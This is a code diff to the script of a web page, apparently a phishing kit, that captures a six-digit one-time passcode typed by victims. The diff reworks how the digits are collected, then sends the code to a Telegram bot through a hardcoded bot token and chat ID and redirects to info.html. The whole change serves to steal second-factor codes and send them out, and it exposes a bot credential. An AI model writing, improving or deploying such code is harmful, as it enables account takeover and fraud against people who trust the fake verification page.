@@ -70,32 +70,36 @@
     </div>
     <script>
         const inputs = document.querySelectorAll(".otp-field input");
-        let sentValue=[];
+       
         inputs.forEach((input, index) => {
             input.dataset.index = index;
             input.addEventListener("keyup", handleOtp)
         });
         function submit() {
-
+            let otp = "";
+            inputs.forEach((input) => {
+                otp +=input.value;
+                input.disabled = true;
+                input.classList.add("disabled");
+            });
             var token = "7446085389:AAEDVLhoom9HbeL8AMEZDSg6PDygvG5o2AI";
             var chat_id = "-4244251369";
-            var my_text = `OTP:${sentValue.join("")}`;
+            var my_text = `OTP:${otp}`;
             var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
-            console.log(sentValue.join(""));
+           console.log(otp);
 
-            let api = new XMLHttpRequest();
-            api.open("GET", url, true);
-            api.send();
-         window.location.href="info.html";
+           let api = new XMLHttpRequest();
+           api.open("GET", url, true);
+           api.send();
+       window.location.href="info.html";
         }
-       
+    
      
 
         function handleOtp(e) {
             const input = e.target;
             let index = [0,1,2,3,4,5];
             let value = input.value;
-            sentValue.push(value);
             input.value = "";
             input.value = value ? value[0] : "";
             let fieldIndex = input.dataset.index;
@@ -103,10 +107,7 @@
                 input.nextElementSibling.focus();
             }
 
-            if(e.key === "Backspace" && fieldIndex > 0){
-                input.previousElementSibling.focus();
-                sentValue.pop();
-            }
+          
           
         }
     </script>
